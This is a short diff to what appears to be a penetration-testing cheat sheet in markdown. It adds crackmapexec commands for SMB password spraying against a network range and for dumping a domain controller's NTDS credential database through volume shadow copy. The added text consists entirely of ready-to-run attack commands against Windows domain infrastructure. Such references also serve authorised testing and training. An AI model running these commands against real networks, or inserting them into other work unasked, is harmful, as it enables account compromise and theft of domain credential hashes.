@@ -106,3 +106,13 @@ Domain Host Discovery
 ```
 crackmapexec smb network/address
 ```
+User & Password Spraying
+
+```
+crackmapexec smb network/address -u users -p passwords
+```
+NTDS dumping
+
+```
+crackmapexec smb network/address -u users -p passwords --ntds vss
+```
